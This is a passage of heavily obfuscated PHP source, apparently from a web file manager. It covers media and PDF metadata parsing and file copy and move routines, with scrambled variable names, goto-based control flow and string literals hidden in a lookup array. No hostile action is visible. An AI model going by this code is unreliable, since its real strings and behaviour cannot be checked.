(!self::support($EèÂ‡İ·[$Bä˜Ô‡‰ËÒ[157]]) || isset($EèÂ‡İ·[$Bä˜Ô‡‰ËÒ[421]])) { return; } $Dº¶Ï£—œ = $Bä˜Ô‡‰ËÒ[1507] . $EèÂ‡İ·[$Bä˜Ô‡‰ËÒ[76]]; goto c”Ù¼ÚøŠ; DÄËÙ±¿: $Bä˜Ô‡‰ËÒ =& $_SERVER[‘®…¢À]; static $Eß¡†­èâí; if (!$Eß¡†­èâí) { require SDK_DIR . $Bä˜Ô‡‰ËÒ[1506]; $Eß¡†­èâí = new getID3(); } goto FÆˆ‹‘Õèº; c”Ù¼ÚøŠ: $FÒ”êñİé˜ = $EèÂ‡İ·[$Bä˜Ô‡‰ËÒ[157]]; try { if ($EèÂ‡İ·[$Bä˜Ô‡‰ËÒ[157]] == $Bä˜Ô‡‰ËÒ[1508]) { $AÅˆ§êÑ¯Ô = self::psdParse($Dº¶Ï£—œ); $FÒ”êñİé˜ = $Bä˜Ô‡‰ËÒ[1509]; } else { if ($EèÂ‡İ·[$Bä˜Ô‡‰ËÒ[157]] == $Bä˜Ô‡‰ËÒ[1510]) { $AÅˆ§êÑ¯Ô = self::pdfParse($Dº¶Ï£—œ); } else { $FÒ”êñİé˜ = self::$fileTypeArray[$Bä˜Ô‡‰ËÒ[1511]][$EèÂ‡İ·[$Bä˜Ô‡‰ËÒ[157]]]; $då¸Ã«åƒ° = self::$fileTypeArray[$Bä˜Ô‡‰ËÒ[1512]][$FÒ”êñİé˜][$Bä˜Ô‡‰ËÒ[1513]]; $D…ÌÇ¸ÇìÎ = @$Eß¡†­èâí->analyze($Dº¶Ï£—œ, $EèÂ‡İ·[$Bä˜Ô‡‰ËÒ[78]], $EèÂ‡İ·[$Bä˜Ô‡‰ËÒ[28]]); $AÅˆ§êÑ¯Ô = self::parseData($D…ÌÇ¸ÇìÎ, $då¸Ã«åƒ°, $EèÂ‡İ·); } } } catch (Exception $Fš¼•Ìóî) { $AÅˆ§êÑ¯Ô = array($Bä˜Ô‡‰ËÒ[368] => $FÒ”êñİé˜); } if (!$AÅˆ§êÑ¯Ô) { return; } goto eŒØÙŒÔ†; eŒØÙŒÔ†: $AÅˆ§êÑ¯Ô[$Bä˜Ô‡‰ËÒ[368]] = $FÒ”êñİé˜; $EèÂ‡İ·[$Bä˜Ô‡‰ËÒ[421]] = $AÅˆ§êÑ¯Ô; return $EèÂ‡İ·; goto b”‡ªá¸¥ª; b”‡ªá¸¥ª: } public static function support($aë§ø­©…Á) { goto B¯á°Æ¥¡è; Dİš‹ˆšàÜ: $E„¥®ŒÆî› = array($Eœ‰´®÷ØÇ[1510], $Eœ‰´®÷ØÇ[1508]); if (in_array($aë§ø­©…Á, $E„¥®ŒÆî›)) { return !0; } if (isset(self::$fileTypeArray[$Eœ‰´®÷ØÇ[1511]][$aë§ø­©…Á])) { return !0; } goto c¬Ê—À³Ğ; B¯á°Æ¥¡è: $Eœ‰´®÷ØÇ =& $_SERVER[‘®…¢À]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $aë§ø­©…Á = strtolower($aë§ø­©…Á); goto Dİš‹ˆšàÜ; c¬Ê—À³Ğ: return !1; goto BÜ¥ôÔÓÙà; BÜ¥ôÔÓÙà: } private static function parseData($A¥ÀÂš¶àæ, $Aåà¦ğñëÖ, $Fª†ñÔåÕ) { $Bªƒ°Êß‘ë =& $_SERVER[‘®…¢À]; $eÎ‰İéè®ñ = $A¥ÀÂš¶àæ[$Bªƒ°Êß‘ë[1514]]; $a‰®…Ö…Û = array(); foreach ($Aåà¦ğñëÖ as $cßÚ„ÒæÕó => $f„”º¨¯´ò) { foreach ($f„”º¨¯´ò as $b×‚·ßë‚˜) { if (is_array($b×‚·ßë‚˜)) { $c½©´àßÈø = self::parseData($A¥ÀÂš¶àæ, $f„”º¨¯´ò, $Fª†ñÔåÕ); if ($c½©´àßÈø) { $a‰®…Ö…Û[$cßÚ„ÒæÕó] = $c½©´àßÈø; } break; } $eœßğÏÈç˜ = str_replace($Bªƒ°Êß‘ë[1292], $eÎ‰İéè®ñ, $b×‚·ßë‚˜); $c½©´àßÈø = _get($A¥ÀÂš¶àæ, $eœßğÏÈç˜); $c½©´àßÈø = is_array($c½©´àßÈø) ? $c½©´àßÈø[0] : $c½©´àßÈø; if ($c½©´àßÈø) { break; } } if ($c½©´àßÈø || $c½©´àßÈø === 0 || $c½©´àßÈø === !1) { $c½©´àßÈø = self::valueReset($b×‚·ßë‚˜, $c½©´àßÈø, $cßÚ„ÒæÕó); if ($c½©´àßÈø !== null) { $a‰®…Ö…Û[$cßÚ„ÒæÕó] = $c½©´àßÈø; } } } $a‰®…Ö…Û = self::valueResetAll($a‰®…Ö…Û, $Fª†ñÔåÕ); return $a‰®…Ö…Û; } private static function psdParse($d’ê ¢º³) { $dÈœ°”»À =& $_SERVER[‘®…¢À]; if (IO::fileSubstr($d’ê ¢º³, 0, 4) != $dÈœ°”»À[1515]) { return !1; } $fÀ¤ŠŞïêÉ = getImageSize($d’ê ¢º³, $f³îÜÄØ®); if (!$fÀ¤ŠŞïêÉ) { return; } $E¸¼Šù¯ Ç = array($dÈœ°”»À[1431] => $fÀ¤ŠŞïêÉ[0], $dÈœ°”»À[1433] => $fÀ¤ŠŞïêÉ[1]); return $E¸¼Šù¯ Ç; } private static function pdfParse($B‹ïİš°ºÜ) { return FileParsePdf::parse($B‹ïİš°ºÜ); } private static function fileTypeParse() { $AÖ“‚ğ¤È¿ =& $_SERVER[‘®…¢À]; $dĞ‹Šö¢ = self::fileTypeArray(); $EêÂÓ¼‰Ë = array(); foreach ($dĞ‹Šö¢ as $bŠ…ñÃËå¼ => $A…¼œ‰Œ) { $EÇŸ·Áôƒœ = _get($A…¼œ‰Œ, $AÖ“‚ğ¤È¿[157], $AÖ“‚ğ¤È¿[33]); $Bç×Íİ¸ï® = is_string($EÇŸ·Áôƒœ) ? explode($AÖ“‚ğ¤È¿[47], $EÇŸ·Áôƒœ) : $EÇŸ·Áôƒœ; if (!$Bç×Íİ¸ï®) { continue; } foreach ($Bç×Íİ¸ï® as $EÇŸ·Áôƒœ) { $EÇŸ·Áôƒœ = strtolower(trim($EÇŸ·Áôƒœ)); if (!$EÇŸ·Áôƒœ) { continue; } $EêÂÓ¼‰Ë[$EÇŸ·Áôƒœ] = $bŠ…ñÃËå¼; } $dĞ‹Šö¢[$bŠ…ñÃËå¼][$AÖ“‚ğ¤È¿[157]] = array_keys($EêÂÓ¼‰Ë); $dĞ‹Šö¢[$bŠ…ñÃËå¼][$AÖ“‚ğ¤È¿[1513]] = self::parseKeyMap($A…¼œ‰Œ[$AÖ“‚ğ¤È¿[1513]]); } return array($AÖ“‚ğ¤È¿[1512] => $dĞ‹Šö¢, $AÖ“‚ğ¤È¿[1511] => $EêÂÓ¼‰Ë); } private static function parseKeyMap($d©‘¶æ¡) { $c†öÇš´¼ =& $_SERVER[‘®…¢À]; foreach ($d©‘¶æ¡ as $bÄ¿ÑŒ‚Œ” => $c™æêÃÎ§Ä) { if (is_array($c™æêÃÎ§Ä)) { $AĞÊğÜ«¨Ø = self::parseKeyMap($c™æêÃÎ§Ä); if ($AĞÊğÜ«¨Ø) { $d©‘¶æ¡[$bÄ¿ÑŒ‚Œ”] = $AĞÊğÜ«¨Ø; } continue; } $d‹¸åÓù¥Ì = explode($c†öÇš´¼[47], $c™æêÃÎ§Ä); $aùö¼Í–ƒ = array(); foreach ($d‹¸åÓù¥Ì as $dî‡·Ô¦œ) { $dî‡·Ô¦œ = trim($dî‡·Ô¦œ); if (!$dî‡·Ô¦œ) { continue; } if (preg_match($c†öÇš´¼[1516], $dî‡·Ô¦œ, $CğÁ“Õİ‹Œ)) { $eàƒƒªå³¼ = explode($c†öÇš´¼[268], $CğÁ“Õİ‹Œ[1]); foreach ($eàƒƒªå³¼ as $D‚¦ª¶Õ‡») { $aùö¼Í–ƒ[] = str_replace($CğÁ“Õİ‹Œ[0], $D‚¦ª¶Õ‡», $dî‡·Ô¦œ); } } else { $aùö¼Í–ƒ[] = $dî‡·Ô¦œ; } } $d©‘¶æ¡[$bÄ¿ÑŒ‚Œ”] = $aùö¼Í–ƒ; } return $d©‘¶æ¡; } private static function valueResetAll($fÅ‹‹ÖÃÈˆ, $e‡§¸ÄÙÂÑ) { goto cÁ¨‰³’Å; D™¹ù¨„¾ƒ: $cÁÛ¼ö†§İ = _get($fÅ‹‹ÖÃÈˆ, $F¯ÂôöĞï[1529], $F¯ÂôöĞï[33]); $cØ³ªÏŸ·Í = $D¯–éÜ™›¤ . $a°•‘¼¨ÁÄ . $cÁÛ¼ö†§İ; if ($cØ³ªÏŸ·Í && get_charset($cØ³ªÏŸ·Í) != $F¯ÂôöĞï[323]) { $fÅ‹‹ÖÃÈˆ[$F¯ÂôöĞï[1526]][$F¯ÂôöĞï[1234]] = iconv_to($fÅ‹‹ÖÃÈˆ[$F¯ÂôöĞï[1526]][$F¯ÂôöĞï[1234]], get_charset($cØ³ªÏŸ·Í), $F¯ÂôöĞï[323]); $fÅ‹‹ÖÃÈˆ[$F¯ÂôöĞï[1526]][$F¯ÂôöĞï[1530]] = iconv_to($fÅ‹‹ÖÃÈˆ[$F¯ÂôöĞï[1526]][$F¯ÂôöĞï[1530]], get_charset($cØ³ªÏŸ·Í), $F¯ÂôöĞï[323]); $fÅ‹‹ÖÃÈˆ[$F¯ÂôöĞï[1526]][$F¯ÂôöĞï[1531]] = iconv_to($fÅ‹‹ÖÃÈˆ[$F¯ÂôöĞï[1526]][$F¯ÂôöĞï[1531]], get_charset($cØ³ªÏŸ·Í), $F¯ÂôöĞï[323]); } goto AŞ»ˆ”‡©; AŞ»ˆ”‡©: return $fÅ‹‹ÖÃÈˆ; goto c³¨ÜÓÁ’Ü; cÁ¨‰³’Å: $F¯ÂôöĞï =& $_SERVER[‘®…¢À]; if (isset($fÅ‹‹ÖÃÈˆ[$F¯ÂôöĞï[1517]])) { $B…¼›“ø¾² = ceil($fÅ‹‹ÖÃÈˆ[$F¯ÂôöĞï[1517]]); $fÍ¢êÚ¨ = intval($B…¼›“ø¾² / 3600); $eÍéÚğÓ = intval(($B…¼›“ø¾² - $fÍ¢êÚ¨ * 3600) / 60); $AÈö½Âß¹‚ = $B…¼›“ø¾² % 60; $fÅ‹‹ÖÃÈˆ[$F¯ÂôöĞï[1518]] = sprintf($F¯ÂôöĞï[1519], $fÍ¢êÚ¨, $eÍéÚğÓ, $AÈö½Âß¹‚); if ($fÍ¢êÚ¨ == 0) { $fÅ‹‹ÖÃÈˆ[$F¯ÂôöĞï[1518]] = sprintf($F¯ÂôöĞï[1520], $eÍéÚğÓ, $AÈö½Âß¹‚); } } $b‚Ê‚‹ì™ = _get($fÅ‹‹ÖÃÈˆ, $F¯ÂôöĞï[1521]); goto bÖô¿¬ëë”; bÖô¿¬ëë”: if ($b‚Ê‚‹ì™) { $aöæéÂŸ¼ = IO_PATH_SYSTEM_TEMP . $F¯ÂôöĞï[1522] . KodIO::hashPath($e‡§¸ÄÙÂÑ) . $F¯ÂôöĞï[1523]; $fÅ‹‹ÖÃÈˆ[$F¯ÂôöĞï[1524]] = Action($F¯ÂôöĞï[1525])->pluginCacheFileSet($aöæéÂŸ¼, $b‚Ê‚‹ì™); unset($fÅ‹‹ÖÃÈˆ[$F¯ÂôöĞï[1526]][$F¯ÂôöĞï[1509]]); } $D¯–éÜ™›¤ = _get($fÅ‹‹ÖÃÈˆ, $F¯ÂôöĞï[1527], $F¯ÂôöĞï[33]); $a°•‘¼¨ÁÄ = _get($fÅ‹‹ÖÃÈˆ, $F¯ÂôöĞï[1528], $F¯ÂôöĞï[33]); goto D™¹ù¨„¾ƒ; c³¨ÜÓÁ’Ü: } private static function valueReset($d‚ÈæÖğŸ¹, $A”½™ÍĞÕ”, $Cæ±šî‹Ş×) { $E†“‹ÉÀˆ =& $_SERVER[‘®…¢À]; $BÑì»˜À = $E†“‹ÉÀˆ[1448]; switch ($d‚ÈæÖğŸ¹) { case $E†“‹ÉÀˆ[1532]: $A”½™ÍĞÕ” = $A”½™ÍĞÕ” == $E†“‹ÉÀˆ[84] ? $E†“‹ÉÀˆ[1533] : $E†“‹ÉÀˆ[1534]; break; case $E†“‹ÉÀˆ[1535]: $A”½™ÍĞÕ” = $A”½™ÍĞÕ” ? $A”½™ÍĞÕ” : null; break; default: break; } switch ($Cæ±šî‹Ş×) { case $E†“‹ÉÀˆ[1536]: $A”½™ÍĞÕ” = round($A”½™ÍĞÕ”, 2); break; case $E†“‹ÉÀˆ[184]: case $E†“‹ÉÀˆ[108]: if ($A”½™ÍĞÕ” < 0) { $A”½™ÍĞÕ” = null; } else { if (is_numeric($A”½™ÍĞÕ”)) { $A”½™ÍĞÕ” = date($BÑì»˜À, $A”½™ÍĞÕ”); } } break; default: break; } return $A”½™ÍĞÕ”; } private static function fileTypeArray() { $EïçÇ Œ› =& $_SERVER[‘®…¢À]; return array($EïçÇ Œ›[1509] => array($EïçÇ Œ›[157] => $EïçÇ Œ›[1537] . $EïçÇ Œ›[1538], $EïçÇ Œ›[1513] => array($EïçÇ Œ›[1431] => $EïçÇ Œ›[1539], $EïçÇ Œ›[1433] => $EïçÇ Œ›[1540], $EïçÇ Œ›[1541] => $EïçÇ Œ›[1542], $EïçÇ Œ›[1543] => $EïçÇ Œ›[1544], $EïçÇ Œ›[184] => $EïçÇ Œ›[1545], $EïçÇ Œ›[108] => $EïçÇ Œ›[1546], $EïçÇ Œ›[1547] => $EïçÇ Œ›[1548], $EïçÇ Œ›[1549] => $EïçÇ Œ›[1550], $EïçÇ Œ›[1551] => $EïçÇ Œ›[1552], $EïçÇ Œ›[1553] => $EïçÇ Œ›[1554], $EïçÇ Œ›[1555] => $EïçÇ Œ›[1556], $EïçÇ Œ›[1557] => $EïçÇ Œ›[1558], $EïçÇ Œ›[1559] => $EïçÇ Œ›[1560], $EïçÇ Œ›[1561] => array($EïçÇ Œ›[1562] => $EïçÇ Œ›[1563], $EïçÇ Œ›[1564] => $EïçÇ Œ›[1565], $EïçÇ Œ›[1566] => $EïçÇ Œ›[1567]), $EïçÇ Œ›[1568] => $EïçÇ Œ›[1569], $EïçÇ Œ›[1570] => $EïçÇ Œ›[1571], $EïçÇ Œ›[1572] => $EïçÇ Œ›[1573], $EïçÇ Œ›[1574] => $EïçÇ Œ›[1575], $EïçÇ Œ›[1576] => array($EïçÇ Œ›[1577] => $EïçÇ Œ›[1578], $EïçÇ Œ›[1579] => $EïçÇ Œ›[1580], $EïçÇ Œ›[1581] => $EïçÇ Œ›[1582], $EïçÇ Œ›[1583] => $EïçÇ Œ›[1584], $EïçÇ Œ›[1585] => $EïçÇ Œ›[1586], $EïçÇ Œ›[1587] => $EïçÇ Œ›[1588], $EïçÇ Œ›[1589] => $EïçÇ Œ›[1590], $EïçÇ Œ›[1591] => $EïçÇ Œ›[1592], $EïçÇ Œ›[1593] => $EïçÇ Œ›[1594], $EïçÇ Œ›[1595] => $EïçÇ Œ›[1596], $EïçÇ Œ›[1597] => $EïçÇ Œ›[1598]))), $EïçÇ Œ›[1599] => array($EïçÇ Œ›[157] => $EïçÇ Œ›[1600] . $EïçÇ Œ›[1601], $EïçÇ Œ›[1513] => array($EïçÇ Œ›[1517] => $EïçÇ Œ›[1602], $EïçÇ Œ›[184] => $EïçÇ Œ›[1603], $EïçÇ Œ›[108] => $EïçÇ Œ›[1604], $EïçÇ Œ›[1549] => $EïçÇ Œ›[1605], $EïçÇ Œ›[1606] => $EïçÇ Œ›[1607], $EïçÇ Œ›[1608] => $EïçÇ Œ›[1535], $EïçÇ Œ›[1609] => $EïçÇ Œ›[1610], $EïçÇ Œ›[1611] => $EïçÇ Œ›[1612], $EïçÇ Œ›[1613] => $EïçÇ Œ›[1614], $EïçÇ Œ›[1526] => array($EïçÇ Œ›[1234] => $EïçÇ Œ›[1615], $EïçÇ Œ›[1530] => $EïçÇ Œ›[1616], $EïçÇ Œ›[1531] => $EïçÇ Œ›[1617], $EïçÇ Œ›[1618] => $EïçÇ Œ›[1619], $EïçÇ Œ›[1620] => $EïçÇ Œ›[1621], $EïçÇ Œ›[1622] => $EïçÇ Œ›[1623], $EïçÇ Œ›[1509] => $EïçÇ Œ›[1624]))), $EïçÇ Œ›[1625] => array($EïçÇ Œ›[157] => $EïçÇ Œ›[1626] . $EïçÇ Œ›[1627], $EïçÇ Œ›[1513] => array($EïçÇ Œ›[1431] => $EïçÇ Œ›[1628], $EïçÇ Œ›[1433] => $EïçÇ Œ›[1629], $EïçÇ Œ›[1517] => $EïçÇ Œ›[1602], $EïçÇ Œ›[184] => $EïçÇ Œ›[1630], $EïçÇ Œ›[108] => $EïçÇ Œ›[1631], $EïçÇ Œ›[1536] => $EïçÇ Œ›[1632], $EïçÇ Œ›[1613] => $EïçÇ Œ›[1633], $EïçÇ Œ›[1609] => $EïçÇ Œ›[1634], $EïçÇ Œ›[1549] => $EïçÇ Œ›[1635], $EïçÇ Œ›[1599] => array($EïçÇ Œ›[1608] => $EïçÇ Œ›[1535], $EïçÇ Œ›[1636] => $EïçÇ Œ›[1637], $EïçÇ Œ›[1606] => $EïçÇ Œ›[1607], $EïçÇ Œ›[1613] => $EïçÇ Œ›[1614], $EïçÇ Œ›[1609] => $EïçÇ Œ›[1638], $EïçÇ Œ›[1611] => $EïçÇ Œ›[1612]))), $EïçÇ Œ›[1639] => array($EïçÇ Œ›[1513] => array($EïçÇ Œ›[1640] => $EïçÇ Œ›[1641], $EïçÇ Œ›[1642] => $EïçÇ Œ›[1643])), $EïçÇ Œ›[1644] => array($EïçÇ Œ›[1513] => array())); } } goto FƒÖÂ–ÎÊ—; B“™¿ÓÊˆİ: function beforeShutdown() { Hook::trigger($_SERVER[Á][35]); } $_SERVER[$_SERVER[Á][36]] = BASIC_PATH; $_SERVER[$_SERVER[Á][37]] = LIB_DIR; goto eë¥è ™–Ì; d“Â˜à†«: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($f„£¥¡èµ, $e”‚ÜÃÑª’) { $E’åÈ¤ÍÒ = self::driverMake($e”‚ÜÃÑª’[0]); if (method_exists($E’åÈ¤ÍÒ, $f„£¥¡èµ)) { return @call_user_func_array(array($E’åÈ¤ÍÒ, $f„£¥¡èµ), $e”‚ÜÃÑª’); } if (method_exists($E’åÈ¤ÍÒ, $_SERVER[‘®…¢À][954])) { return @call_user_func_array(array($E’åÈ¤ÍÒ, $f„£¥¡èµ), $e”‚ÜÃÑª’); } else { if (method_exists(self, $f„£¥¡èµ)) { return @call_user_func_array(array(self, $f„£¥¡èµ), $e”‚ÜÃÑª’); } else { call_user_func_array(array(parent, $f„£¥¡èµ), $e”‚ÜÃÑª’); } } } public static function init($bÀÇ‹ï¾Ÿ¾) { return self::driverMake($bÀÇ‹ï¾Ÿ¾); } public static function copy($e‹ñ”›‰ã™, $cµëåŸÍŠÎ, $AêÁï‡ªÑ = false, $fåêì¹Ü§Î = false) { return self::copyMove($e‹ñ”›‰ã™, $cµëåŸÍŠÎ, $AêÁï‡ªÑ, $_SERVER[‘®…¢À][481], $fåêì¹Ü§Î); } public static function move($a¶æİğ‚œ, $c¢¾«’§©‰, $AÁÚÔ¶•Ä­ = false, $D‘ÙœÍù = false) { return self::copyMove($a¶æİğ‚œ, $c¢¾«’§©‰, $AÁÚÔ¶•Ä­, $_SERVER[‘®…¢À][483], $D‘ÙœÍù); } public static function saveFile($FöõŒ‹—í, $F÷Æ§¶‹³, $eà˜Çá¼µ = true) { goto c½Ÿ´—õ¦Ÿ; DŒñ­‘¥É: $e¤ù¸ÀÊø‰ = self::copyFile($F¿Öœ­„ß, $FöõŒ‹—í, $Eµ¾­Œˆƒ, $b–İ»ª¢…›, $C˜íŠÉŒîº[$E¹‘ğŞ§Ä½[28]], $E‚ë†ğÑÕÍ); if ($bÉÎ·£ïË) { $e¤ù¸ÀÊø‰ = $bÉÎ·£ïË->getPathOuter($e¤ù¸ÀÊø‰); } return $e¤ù¸ÀÊø‰; goto cÑ¬²ßîòÜ; câíããç™³: $b–İ»ª¢…› = $Eµ¾­Œˆƒ->pathFather($F÷Æ§¶‹³); $E‚ë†ğÑÕÍ = !0; if (!$eà˜Çá¼µ && self::driverIsSame($F¿Öœ­„ß, $Eµ¾­Œˆƒ)) { $E‚ë†ğÑÕÍ = !1; } goto DŒñ­‘¥É; c½Ÿ´—õ¦Ÿ: $E¹‘ğŞ§Ä½ =& $_SERVER[‘®…¢À]; $C˜íŠÉŒîº = self::info($F÷Æ§¶‹³); $F¿Öœ­„ß = self::driverMake($FöõŒ‹—í); goto eã¬ºƒ¡÷´; eã¬ºƒ¡÷´: $Eµ¾­Œˆƒ = self::driverMake($F÷Æ§¶‹³); $bÉÎ·£ïË = !1; if ($Eµ¾­Œˆƒ->pathParse[$E¹‘ğŞ§Ä½[955]]) { $dÏßÛ©¨…Œ = $Eµ¾­Œˆƒ->pathParse[$E¹‘ğŞ§Ä½[955]]; $bÉÎ·£ïË = $Eµ¾­Œˆƒ; $Eµ¾­Œˆƒ = self::driverMake($dÏßÛ©¨…Œ); } goto câíããç™³; cÑ¬²ßîòÜ: } private static function copyMove($DŠ„œ®ÍîÃ, $B½—‹­Ì›¢, $C¨®Ö¨Ó¯˜, $b¾³­ˆƒ¬—, $f†Š¼ù‰ƒÙ = false) { goto aöèÜì…ÆÍ; b©°ÆÀ´¦È: $A‡ˆÜ ëµß = $F‚¹ÅÖóÀ->isFile($DŠ„œ®ÍîÃ); if (!$A‡ˆÜ ëµß && $DİŸ÷²‡->getType() == $DÅÙ¢‘‹ô[667] && $F‚¹ÅÖóÀ->getType() == $DÅÙ¢‘‹ô[104]) { $D¶…‰àŒÉ­ = $DİŸ÷²‡->copyFolderFromIO($F‚¹ÅÖóÀ, $DŠ„œ®ÍîÃ, $B½—‹­Ì›¢, $C¨®Ö¨Ó¯˜, $B‹ÆÔˆùƒ, $f†Š¼ù‰ƒÙ); } else { $D¶…‰àŒÉ­ = self::copyPath($F‚¹ÅÖóÀ, $DŠ„œ®ÍîÃ, $DİŸ÷²‡, $B½—‹­Ì›¢, $C¨®Ö¨Ó¯˜, $B‹ÆÔˆùƒ, $A‡ˆÜ ëµß, $f†Š¼ù‰ƒÙ); } if ($D¶…‰àŒÉ­ && $B‹ÆÔˆùƒ) { $F‚¹ÅÖóÀ->remove($DŠ„œ®ÍîÃ); } goto Bµ›Ş®Ğ¹; Bµ›Ş®Ğ¹: if ($E‡ªŞõ¥‚) { $D¶…‰àŒÉ­ = $E‡ªŞõ¥‚->getPathOuter($D¶…‰àŒÉ­); } return $D¶…‰àŒÉ­; goto Dˆ¿ã‚‹îÓ; f¡¿õ›©‰¤: $E‡ªŞõ¥‚ = !1; if ($DİŸ÷²‡->pathParse[$DÅÙ¢‘‹ô[955]]) { $B½—‹­Ì›¢ = $DİŸ÷²‡->pathParse[$DÅÙ¢‘‹ô[955]]; $E‡ªŞõ¥‚ = $DİŸ÷²‡; $DİŸ÷²‡ = self::driverMake($B½—‹­Ì›¢); } self::check($F‚¹ÅÖóÀ, $DŠ„œ®ÍîÃ, $DİŸ÷²‡, $B½—‹­Ì›¢); goto F¦‡œ³ªÂæ; f™™‡ÙäÛ: $F‚¹ÅÖóÀ = self::driverMake($DŠ„œ®ÍîÃ); $DİŸ÷²‡ = self::driverMake($B½—‹­Ì›¢); $B‹ÆÔˆùƒ = $b¾³­ˆƒ¬— == $DÅÙ¢‘‹ô[483]; goto f¡¿õ›©‰¤; F¦‡œ³ªÂæ: Hook::trigger($DÅÙ¢‘‹ô[73], $F‚¹ÅÖóÀ, $DŠ„œ®ÍîÃ, $DİŸ÷²‡, $B½—‹­Ì›¢); $B„µ¾å³ì = self::driverIsSame($F‚¹ÅÖóÀ, $DİŸ÷²‡); if ($B„µ¾å³ì) { if ($b¾³­ˆƒ¬— == $DÅÙ¢‘‹ô[483] && trim($B½—‹­Ì›¢, $DÅÙ¢‘‹ô[8]) == trim($DİŸ÷²‡->pathFather($DŠ„œ®ÍîÃ), $DÅÙ¢‘‹ô[8])) { return $DİŸ÷²‡->getPathOuter($DŠ„œ®ÍîÃ); } if (method_exists($DİŸ÷²‡, $b¾³­ˆƒ¬—)) { return $DİŸ÷²‡->{$b¾³­ˆƒ¬—}($DŠ„œ®ÍîÃ, $B½—‹­Ì›¢, $C¨®Ö¨Ó¯˜); } } goto b©°ÆÀ´¦È; aöèÜì…ÆÍ: $DÅÙ¢‘‹ô =& $_SERVER[‘®…¢À]; if (!$DŠ„œ®ÍîÃ || $DŠ„œ®ÍîÃ == $DÅÙ¢‘‹ô[8] || !$B½—‹­Ì›¢) { return !1; } ignore_timeout(); goto f™™‡ÙäÛ; Dˆ¿ã‚‹îÓ: } private static function check($C—Ğ¡‘…¨Ù, $fí§œ‡ÎÉ‹, $a­Ö„Ã°ÒË, &$C—¼Ì“Ï‹­) { $F¦•àçŒÕ =& $_SERVER[‘®…¢À]; if (self::driverIsSame($C—Ğ¡‘…¨Ù, $a­Ö„Ã°ÒË) && $C—Ğ¡‘…¨Ù->isFolder($fí§œ‡ÎÉ‹) && $C—Ğ¡‘…¨Ù->isParentOf($fí§œ‡ÎÉ‹, $C—¼Ì“Ï‹­)) { show_json(LNG($F¦•àçŒÕ[956]), !1); } if (!$C—Ğ¡‘…¨Ù->exist($fí§œ‡ÎÉ‹)) { show_json(LNG($F¦•àçŒÕ[103]), !1); } } private static function copyPath($f»¨­‘¤®, $DÀ¯¤–í‰­, $a¼‚ŸÀß , $cÍö¶¸, $Cµì¶ëß‚õ, $dÓ²…°ëˆŞ, $b ëÔœßÙó, $c© ‹ğ”¤• = false) { goto d˜îœçßï; CÜÄÏóÆ‡ˆ: $AÔ¼å‹õ = $a¼‚ŸÀß ->mkdir($a¼‚ŸÀß ->getPath($dº¢ ¶øğ—)); $cÍö¶¸ = $a¼‚ŸÀß ->getPathInner($AÔ¼å‹õ); $b•¦’¹§æ¯ = $f»¨­‘¤®->listPath($DÀ¯¤–í‰­, !0); goto d¢²£Ø·«È; eÄùëËéÇ¥: if ($b ëÔœßÙó) { return self::copyFile($f»¨­‘¤®, $DÀ¯¤–í‰­, $a¼‚ŸÀß , $cÍö¶¸, $eí‰â™ƒ–, $dÓ²…°ëˆŞ); } if ($Cµì¶ëß‚õ == REPEAT_RENAME_FOLDER) { $Cµì¶ëß‚õ = !1; } $dº¢ ¶øğ— = rtrim($cÍö¶¸, $Báß»¦ìƒí[8]) . $Báß»¦ìƒí[8] . $eí‰â™ƒ–; goto CÜÄÏóÆ‡ˆ; d˜îœçßï: $Báß»¦ìƒí =& $_SERVER[‘®…¢À]; $eí‰â™ƒ– = $c© ‹ğ”¤• ? $c© ‹ğ”¤• : $f»¨­‘¤®->getPathName($f»¨­‘¤®->pathThis($DÀ¯¤–í‰­)); if ($Cµì¶ëß‚õ) { $EÍËÛÌÛä  = $a¼‚ŸÀß ->fileNameExist($cÍö¶¸, $eí‰â™ƒ–); $eí‰â™ƒ– = $a¼‚ŸÀß ->fileNameAuto($cÍö¶¸, $eí‰â™ƒ–, $Cµì¶ëß‚õ, !$b ëÔœßÙó); $Cµì¶ëß‚õ = $EÍËÛÌÛä  ? $Cµì¶ëß‚õ : !1; } goto eÄùëËéÇ¥; d¢²£Ø·«È: $CÜ¶ÖôÂ²ë = array_merge($b•¦’¹§æ¯[$Báß»¦ìƒí[74]], $b•¦’¹§æ¯[$Báß»¦ìƒí[75]]); foreach ($CÜ¶ÖôÂ²ë as $fã¬ß®Ñå×) { $aÃœ—á‘ = $fã¬ß®Ñå×[$Báß»¦ìƒí[29]] == $Báß»¦ìƒí[164]; $DÀ¯¤–í‰­ = $f»¨­‘¤®->getPathInner($fã¬ß®Ñå×[$Báß»¦ìƒí[76]]); $F›¶Äïçí° = self::copyPath($f»¨­‘¤®, $DÀ¯¤–í‰­, $a¼‚ŸÀß , $cÍö¶¸, $Cµì¶ëß‚õ, $dÓ²…°ëˆŞ, $aÃœ—á‘); if (!$F›¶Äïçí°) { write_log($Báß»¦ìƒí[957] . $DÀ¯¤–í‰­ . $Báß»¦ìƒí[958] . $cÍö¶¸, $Báß»¦ìƒí[959]); } } return $AÔ¼å‹õ; goto EîÜŸê”ˆ°; EîÜŸê”ˆ°: } private static function copyFile($C³·‚óéê, $E´Æò´êŠ, $C¦Óã¡Ï’, $b¡‘É¿ó¸, $eÑ¸’å½˜ó, $C¸ëÇ§¸«ƒ) { goto dÈÓÁª„º; dÈÓÁª„º: $d¦ÛÂÅ‹«‚ =& $_SERVER[‘®…¢À]; $b¡‘É¿ó¸ = $C¦Óã¡Ï’->getPath(rtrim($b¡‘É¿ó¸, $d¦ÛÂÅ‹«‚[8]) . $d¦ÛÂÅ‹«‚[8] . $eÑ¸’å½˜ó); $AÍ†à“Âœ‰ = $d¦ÛÂÅ‹«‚[960] . time() . rand_string(5); goto aêÃ†‰ğùÌ; C¬õéĞ‘¹: mk_dir($B÷Ä¸ÏñÍ); $BÄ¾ÏÊË = $B÷Ä¸ÏñÍ . $AÍ†à“Âœ‰; $BÄ¾ÏÊË = $C³·‚óéê->download($E´Æò´êŠ, $BÄ¾ÏÊË); goto BÑÁÌà»Š; BÑÁÌà»Š: $BÄ¾ÏÊË = $C³·‚óéê->iconvApp($BÄ¾ÏÊË); $B†£‰ÈÒˆÄ = $C¦Óã¡Ï’->upload($b¡‘É¿ó¸, $BÄ¾ÏÊË, $C¸ëÇ§¸«ƒ); self::remove($B÷Ä¸ÏñÍ . $AÍ†à“Âœ‰); goto A¸±ºÍò¿Ç; A¸±ºÍò¿Ç: 